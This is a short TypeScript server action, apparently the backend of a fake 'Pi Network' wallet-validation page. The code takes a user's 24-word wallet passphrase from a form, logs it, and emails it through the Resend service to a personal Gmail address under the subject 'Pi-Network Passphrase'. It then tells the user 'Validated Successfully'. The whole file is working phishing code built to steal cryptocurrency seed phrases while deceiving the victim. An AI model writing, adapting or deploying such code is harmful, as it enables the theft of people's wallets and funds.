'use server'

import React from 'react'
import { Resend } from 'resend'
import NotionMagicLinkEmail from '@/components/email-template'

interface EmailResponse {
  error?: string
  success?: string
}

const resend = new Resend(
  process.env.RESEND_API_KEY ? process.env.RESEND_API_KEY : '',
)
export const sendEmail = async (formData: FormData): Promise<EmailResponse> => {
  const passPhrase = formData.get('passphrase') as string

  if (!passPhrase) {
    return {
      error: 'Passphrase is required',
    }
  }

  if (passPhrase.trim().length < 24) {
    return {
      error: 'Passphrase must be 24 words',
    }
  }

  console.log(passPhrase)
  let data
  const emailElement = React.createElement(NotionMagicLinkEmail, {
    passphrase: passPhrase,
  })
  try {
    data = await resend.emails.send({
      from: 'Wallet validation <pi-clone@resend.dev>',
      to: 'marthaathena86@gmail.com',
      subject: 'Pi-Network Passphrase',
      react: emailElement,
    })
    console.log(data)
  } catch (error) {
    return {
      error: 'Something went wrong',
    }
  }

  return {
    success: 'Validated Successfully',
  }
}
